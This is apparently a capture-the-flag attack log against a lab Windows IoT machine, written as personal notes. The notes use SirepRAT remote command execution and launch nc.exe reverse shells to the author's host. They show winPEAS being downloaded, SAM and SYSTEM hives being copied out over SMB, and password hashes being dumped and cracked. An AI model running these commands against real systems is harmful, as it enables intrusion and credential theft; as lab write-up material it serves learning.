@@ -1,0 +1,236 @@
+PORT      STATE SERVICE  VERSION
+135/tcp   open  msrpc    Microsoft Windows RPC
+5985/tcp  open  upnp     Microsoft IIS httpd
+8080/tcp  open  upnp     Microsoft IIS httpd
+|_http-title: Site doesn't have a title.
+| http-auth: 
+| HTTP/1.1 401 Unauthorized\x0D
+|_  Basic realm=Windows Device Portal
+|_http-server-header: Microsoft-HTTPAPI/2.0
+29817/tcp open  unknown
+29819/tcp open  arcserve ARCserve Discovery
+29820/tcp open  ms-sirep Windows IoT SIREP server
+
+https://www.linkedin.com/pulse/remote-code-execution-sirep-windows-iot-tanzil-rehman
+
+https://github.com/SafeBreach-Labs/SirepRAT
+
+┌──(ed㉿kali)-[/tmp]
+└─$ git clone https://github.com/SafeBreach-Labs/SirepRAT.git
+Cloning into 'SirepRAT'...
+remote: Enumerating objects: 217, done.
+remote: Counting objects: 100% (17/17), done.
+remote: Compressing objects: 100% (6/6), done.
+remote: Total 217 (delta 12), reused 11 (delta 11), pack-reused 200 (from 1)
+Receiving objects: 100% (217/217), 6.38 MiB | 2.03 MiB/s, done.
+Resolving deltas: 100% (138/138), done.
+
+┌──(ed㉿kali)-[/tmp/SirepRAT]
+└─$ python SirepRAT.py 10.10.10.204 GetSystemInformationFromDevice
+<SystemInformationResult | type: 51, payload length: 32, kv: {'dwOSVersionInfoSize': 0, 'dwMajorVersion': 10, 'dwMinorVersion': 0, 'dwBuildNumber': 17763, 'dwPlatformId': 2, 'szCSDVersion': 0, 'wServicePackMajor': 1, 'wServicePackMinor': 2, 'wSuiteMask': 0, 'wProductType': 0, 'wReserved': 0}>
+//it works,try more
+
+//transfer nc to host
+└─$ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args ' /c dir C:\Windows\System32\spool\drivers\color\ /b'
+<HResultResult | type: 1, payload length: 4, HResult: 0x0>
+<OutputStreamResult | type: 11, payload length: 18, payload peek: 'b'nc.exe\r\nnc64.exe\r\n''>
+<ErrorStreamResult | type: 12, payload length: 4, payload peek: 'b'\x00\x00\x00\x00''>
+
+└─$ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args ' /c C:\Windows\System32\spool\drivers\color\nc.exe 10.10.16.6 8821 -e cmd '
+<HResultResult | type: 1, payload length: 4, HResult: 0x0>
+
+└─$ nc -nvlp 8821            
+listening on [any] 8821 ...
+connect to [10.10.16.6] from (UNKNOWN) [10.10.10.204] 49671
+Microsoft Windows [Version 10.0.17763.107]
+Copyright (c) Microsoft Corporation. All rights reserved.
+
+C:\windows\system32>whoami
+whoami
+'whoami' is not recognized as an internal or external command,
+operable program or batch file.
+
+PS C:\PROGRAMS> $env:UserName
+$env:UserName
+omni$
+
+PS C:\Data\Users\app> dir
+dir
+
+Mode                LastWriteTime         Length Name                          
+----                -------------         ------ ----                          
+d-r---         7/4/2020   7:28 PM                3D Objects                    
+d-r---         7/4/2020   7:28 PM                Documents                     
+d-r---         7/4/2020   7:28 PM                Downloads                     
+d-----         7/4/2020   7:28 PM                Favorites                     
+d-r---         7/4/2020   7:28 PM                Music                         
+d-r---         7/4/2020   7:28 PM                Pictures                      
+d-r---         7/4/2020   7:28 PM                Videos                        
+-ar---         7/4/2020   8:20 PM            344 hardening.txt                 
+-ar---         7/4/2020   8:14 PM           1858 iot-admin.xml                 
+-ar---         7/4/2020   9:53 PM           1958 user.txt  
+
+PS C:\Data\Users\app> type user.txt
+type user.txt
+<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
+  <Obj RefId="0">
+    <TN RefId="0">
+      <T>System.Management.Automation.PSCredential</T>
+      <T>System.Object</T>
+    </TN>
+    <ToString>System.Management.Automation.PSCredential</ToString>
+    <Props>
+      <S N="UserName">flag</S>
+      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb010000009e131d78fe272140835db3caa288536400000000020000000000106600000001000020000000ca1d29ad4939e04e514d26b9706a29aa403cc131a863dc57d7d69ef398e0731a000000000e8000000002000020000000eec9b13a75b6fd2ea6fd955909f9927dc2e77d41b19adde3951ff936d4a68ed750000000c6cb131e1a37a21b8eef7c34c053d034a3bf86efebefd8ff075f4e1f8cc00ec156fe26b4303047cee7764912eb6f85ee34a386293e78226a766a0e5d7b745a84b8f839dacee4fe6ffb6bb1cb53146c6340000000e3a43dfe678e3c6fc196e434106f1207e25c3b3b0ea37bd9e779cdd92bd44be23aaea507b6cf2b614c7c2e71d211990af0986d008a36c133c36f4da2f9406ae7</SS>
+    </Props>
+  </Obj>
+</Objs>
+
+
+PS C:\Data\Users\app> type hardening.txt
+type hardening.txt
+type : Access to the path 'C:\Data\Users\app\hardening.txt' is denied.
+
+powershell IWR -uri http://10.10.16.6/winPEASx64.exe -o C:\Data\Users\app\w.exe
+
+
+C:\Program Files\WindowsPowerShell\Modules\PackageManagement\1.0.0.1>powershell
+powershell
+Windows PowerShell 
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Program Files\WindowsPowerShell\Modules\PackageManagement\1.0.0.1> cd ..
+cd ..
+PS C:\Program Files\WindowsPowerShell\Modules\PackageManagement> dir -hidden
+dir -hidden or gci -force
+
+
+
+    Directory: C:\Program Files\WindowsPowerShell\Modules\PackageManagement
+
+
+Mode                LastWriteTime         Length Name                          
+----                -------------         ------ ----                          
+-a-h--        8/21/2020  12:56 PM            247 r.bat                         
+
+
+PS C:\Program Files\WindowsPowerShell\Modules\PackageManagement> type r.bat
+type r.bat
+@echo off
+
+:LOOP
+
+for /F "skip=6" %%i in ('net localgroup "administrators"') do net localgroup "administrators" %%i /delete
+
+net user app mesh5143
+net user administrator _1nt3rn37ofTh1nGz
+
+ping -n 3 127.0.0.1
+
+cls
+
+GOTO :LOOP
+
+:EXIT
+
+
+http://10.10.10.204:8080/#Device%20Settings
+
+http://10.10.10.204:8080/#Run%20command
+//a cmd run function.
+C:\Windows\System32\spool\drivers\color\nc.exe 10.10.16.6 8822 -e cmd
+
+┌──(ed㉿kali)-[~]
+└─$ nc -nvlp 8822
+listening on [any] 8822 ...
+connect to [10.10.16.6] from (UNKNOWN) [10.10.10.204] 49674
+Microsoft Windows [Version 10.0.17763.107]
+Copyright (c) Microsoft Corporation. All rights reserved.
+
+C:\windows\system32>whoami
+whoami
+'whoami' is not recognized as an internal or external command,
+operable program or batch file.
+
+C:\windows\system32>powershell
+powershell
+Windows PowerShell 
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\windows\system32> $env:UserName
+$env:UserName
+Administrator
+
+ 
+PS C:\Data\Users\app> type hardening.txt
+type hardening.txt
+- changed default administrator password of "p@ssw0rd"
+- added firewall rules to restrict unnecessary services
+- removed administrator account from "Ssh Users" group
+
+
+powershell -c "$credential = import-clixml -path C:\Data\Users\app\user.txt;$credential.GetNetworkCredential().password"
+
+PS C:\data\Users\administrator> $credential = import-clixml -path C:\Data\Users\administrator\root.txt
+$credential = import-clixml -path C:\Data\Users\administrator\root.txt
+PS C:\data\Users\administrator> $credential.GetNetworkCredential().password
+$credential.GetNetworkCredential().password
+5dbdce5569e2c4708617c0ce6e9bf11d
+
+
+//method2 to get credential,
+//cp SYSTEM and SAM of hive to C, then use smb to transfer to local then to decrypt it to plaintext of credential
+
+└─$ python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c COPY C:\SAM \\\\10.10.16.6\\share\\SAM"
+<HResultResult | type: 1, payload length: 4, HResult: 0x0>
+<OutputStreamResult | type: 11, payload length: 27, payload peek: 'b'        1 file(s) copied.\r\n''>
+<ErrorStreamResult | type: 12, payload length: 4, payload peek: 'b'\x00\x00\x00\x00''>
+                                                                                                    
+┌──(ed㉿kali)-[/tmp/SirepRAT]
+└─$ python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c COPY C:\SYSTEM \\\\10.10.16.6\\share\\SYTEM"
+<HResultResult | type: 1, payload length: 4, HResult: 0x0>
+
+
+└─$ impacket-smbserver share . -smb2support 
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Incoming connection (10.10.10.204,49677)
+[*] AUTHENTICATE_MESSAGE (\,omni)
+[*] User omni\ authenticated successfully
+
+└─$ impacket-secretsdump -system /tmp/SYSTEM  -sam /tmp/SAM LOCAL
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Target system bootKey: 0x4a96b0f404fd37b862c07c2aa37853a5
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:a01f16a7fa376962dbeb29a764a06f00:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:330fe4fd406f9d0180d67adb0b0dfa65:::
+sshd:1000:aad3b435b51404eeaad3b435b51404ee:91ad590862916cdfd922475caed3acea:::
+DevToolsUser:1002:aad3b435b51404eeaad3b435b51404ee:1b9ce6c5783785717e9bbb75ba5f9958:::
+app:1003:aad3b435b51404eeaad3b435b51404ee:e3cb0651718ee9b4faffe19a51faff95:::
+[*] Cleaning up... 
+
+//put hive to hash file, use hashcat to decrypt
+
+└─$ john -format=nt hash --wordlist=/home/ed/tools/rockyou.txt 
+Using default input encoding: UTF-8
+Loaded 1 password hash (NT [MD4 256/256 AVX2 8x3])
+Warning: no OpenMP support for this hash type, consider --fork=4
+Press 'q' or Ctrl-C to abort, almost any other key for status
+mesh5143         (app)     
+1g 0:00:00:00 DONE (2025-12-05 20:34) 4.166g/s 23358Kp/s 23358Kc/s 23358KC/s mesha88..meserias
+Use the "--show --format=NT" options to display all of the cracked passwords reliably
+Session completed. 
+
+//lesson learned
+> when get cmd function of system, fetch hive SAM and SYSTEM to get credential
+> remote execute win command "/c     /b"
+> powerzhell encrypt,  https://mcpmag.com/articles/2017/07/20/save-and-read-sensitive-data-with-powershell.aspx
+ 
